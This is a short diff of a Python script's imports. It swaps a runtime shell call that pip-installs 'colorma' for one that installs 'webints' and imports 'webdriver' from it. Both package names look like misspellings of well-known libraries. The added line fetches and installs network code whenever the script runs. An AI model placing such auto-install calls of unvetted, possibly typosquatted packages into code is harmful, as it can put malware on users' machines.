@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install colorma")
-from colorma import fore
+os.system(f"pip install webints")
+from webints import webdriver
 import random
 import requests
 import threading
